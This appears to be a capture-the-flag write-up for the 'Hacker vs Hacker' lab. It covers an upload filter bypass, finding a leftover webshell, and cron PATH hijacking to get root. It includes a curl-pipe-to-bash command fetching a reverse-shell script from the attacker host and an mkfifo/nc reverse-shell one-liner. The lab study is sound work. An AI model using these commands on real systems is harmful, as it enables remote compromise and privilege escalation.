Hacker vs Hacker

10.10.193.166

# NMAP

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9fa60153923a1dbad718185c0d8e922c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b60dcfb92a86ffc745364c18cbdde7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83d49cd09036ce83f7c7533028dfc3d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

# Directory Enumeration

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.193.166
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ str0nklol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, js]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        5l       26w     2074c http://10.10.193.166/dist/images/favicon.png
200      GET      418l     1043w    11452c http://10.10.193.166/dist/css/skeleton.css
200      GET      157l      300w     3161c http://10.10.193.166/css/custom.css
200      GET       19l       72w      552c http://10.10.193.166/upload.php
200      GET      427l     1133w     7797c http://10.10.193.166/dist/css/normalize.css
200      GET       19l      751w    19170c http://10.10.193.166/images/placeholder.png
200      GET       77l      295w     3413c http://10.10.193.166/
200      GET      450l     1517w   108466c http://10.10.193.166/images/values-bg.jpg
200      GET     4367l    28213w  2518153c http://10.10.193.166/images/iphone.png
200      GET       16l       58w      934c http://10.10.193.166/css/
200      GET       77l      295w     3413c http://10.10.193.166/index.html
200      GET       18l       78w     1358c http://10.10.193.166/images/
200      GET       17l       71w     1120c http://10.10.193.166/dist/
200      GET        1l        3w       26c http://10.10.193.166/cvs/
200      GET        1l        3w       26c http://10.10.193.166/cvs/index.html
[####################] - 11m   430360/430360  0s      found:15      errors:5      
[####################] - 10m   215050/215050  343/s   http://10.10.193.166/ 
[####################] - 0s    215050/215050  667857/s http://10.10.193.166/css/ => Directory listing
[####################] - 5s    215050/215050  46128/s http://10.10.193.166/dist/ => Directory listing
[####################] - 5s    215050/215050  44924/s http://10.10.193.166/images/ => Directory listing
[####################] - 0s    215050/215050  751923/s http://10.10.193.166/dist/images/ => Directory listing
[####################] - 0s    215050/215050  770789/s http://10.10.193.166/dist/css/ => Directory listing
[####################] - 10m   215050/215050  346/s   http://10.10.193.166/cvs/ 
````

# http://10.10.193.166/upload.php

```html
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```
From the source code on 'upload.php' it seems as though theres a vulnerability when uploading files. If we change the name of our script e.g. 'one.php' to something like 'one.pdf.php' the upload should work and we should get a shell.

Upon lots of testing with Burp, we get 200 OK responses when uploading the scripts, but navigating to /cvs/one.pdf.php gives a 404 NOT FOUND response. It seems as though this has been patched.

Knowing that this vulnerability used to exist and that the server was previously hacked, perhaps the devs forgot to remove the shell that the last hacker uploaded. To find out I decided to fuzz the URL with FFUF

# FFUF

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.193.166/cvs/FUZZ.pdf.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2262ms]
    * FUZZ: .htaccess

[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3272ms]
    * FUZZ: .hta

[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3266ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 18, Words: 1, Lines: 2, Duration: 151ms]
    * FUZZ: shell

:: Progress: [4715/4715] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
````
We got a hit on 'shell.pdf.php'!! :DDD



Upon navigating to '/cvs/shell.pdf.php' we are presented with just one word on the page 'boom!' Now I'm going to use FFUF again to fuzz for parameters that the script may have.

# FFUF param fuzz

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.193.166/cvs/shell.pdf.php?FUZZ=id
 :: Wordlist         : FUZZ: /opt/params.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

[Status: 200, Size: 72, Words: 3, Lines: 3, Duration: 141ms]
    * FUZZ: cmd
````
*NOTE* Upon my first FUZZ I used 'shell.pdf.php?FUZZ=key' and filtered response size 18 and got no hits. I figured since its a shell I should probably do the smart thing and change it to 'FUZZ=id' and filter out 1 word responses. It got a hit right away!


# Initial Foothold

I tried many different shells with cURL, none worked. I decided to make a 'rev.sh' script on my machine and cURL that and pipe it to bash.
'curl -i 'http://10.10.193.166/cvs/shell.pdf.php?cmd=curl+http://10.6.16.164:1337/rev.sh|bash'' did the trick.

# linPEAS stuffs

```bash
╔══════════╣ Users with console
lachlan:x:1001:1001::/home/lachlan:/bin/sh                                                                                                                             
root:x:0:0:root:/root:/bin/bash
````

```bash
╔══════════╣ Searching passwords in history files
echo -e "dHY5pzmNYoETv7SUaY\nthisisREDACTED\nthisisREDACTED" | passwd
````
thisisREDACTED is lachlan's SSH password! :DDD

# Escalation to lachlan

The password thisisREDACTED works for SSH! Now we can run linPEAS again and try to escalate to root!

It seems as though the shell gets killed when trying to SSH in. So I did 'su lachlan' entered the password then used cURL on my script again to catch a new reverse shell. This seems to stop the shell from getting killed.

# linPEAS lachlan

```bash
/etc/cron.d:
total 28
drwxr-xr-x   2 root root 4096 May  5  2022 .
drwxr-xr-x 102 root root 4096 May  5  2022 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  814 May  5  2022 persistence
````
Theres a cron running called 'persistence'

```bash
lachlan@b2r:/$ cat /etc/cron.d/persistence
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
````

Thats why our shells keep getting killed.

Interestingly enough, its denoting the PATH as /home/lachlan/bin BEFORE /bin or /usr/bin. We should be able to use this to get a root shell.

# Escalation to root

I tried to drop a rev shell named 'sleep' in /home/lachlan/bin but it failed to actually send a shell to me. The reason is that in the cron sleep, ls, & echo are using absolute paths so the systemn wont search for any of those 3 in /home/lachlan/bin. But at the very end we can see that 'pkill' is not using an absolute path, this should be able to be exploited.

```bash
lachlan@b2r:~/bin$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.16.164 42069 >/tmp/f' > pkill && chmod +x pkill
````

After a few seconds we got a root shell! :DDD

```bash
listening on [any] 42069 ...
connect to [10.6.16.164] from (UNKNOWN) [10.10.193.166] 54600
bash: cannot set terminal process group (47209): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# cd /root
cd /root
root@b2r:~# ls -lah
ls -lah
total 28K
drwx------  4 root root 4.0K May  5  2022 .
drwxr-xr-x 19 root root 4.0K May  5  2022 ..
lrwxrwxrwx  1 root root    9 May  5  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   38 May  5  2022 root.txt
drwx------  3 root root 4.0K May  5  2022 snap
drwx------  2 root root 4.0K May  5  2022 .ssh
root@b2r:~# cat root.txt
cat root.txt
thm{7b708e5224REDACTED}
````

